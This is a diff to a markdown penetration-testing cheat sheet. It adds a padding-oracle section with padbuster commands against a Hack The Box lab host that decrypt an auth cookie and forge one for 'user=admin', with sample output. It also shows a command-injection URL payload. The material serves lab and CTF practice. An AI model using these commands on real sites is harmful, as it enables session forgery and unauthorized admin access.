@@ -137,7 +137,32 @@ It is important to note that while testing against this attack, it is not enough
   Executing os specific commands
    * In url
       /index.php?arg=1; phpinfo()
-      
+ ## 5. Padding oracle Attack
+          
+   Detecting.
+   
+   -When a user autologin after account creation
+   
+   -When the same value of cookie occurs all time the user log in again (It should be different if secure  
+     
+   Attack
+   
+   * Using padbuster. Decrypt the given cookie after you create account
+       
+            padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" 
+            
+   output
+
+            Block 1 Results:
+            [+] Cipher Text (HEX): 14f46190ffbc7fca
+            [+] Intermediate Bytes (HEX): 2ceed986a43708c1
+            [+] Plain Text: user=pet
+   Then create new admin user cookie
+    
+         padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" -plaintext 'user=admin'
+ 
+ reference
+     * https://forum.hackthebox.com/t/lazy-mini-writeup-ways-to-login/88
   ==================================================== <br>
 
 # Client side Exploitation
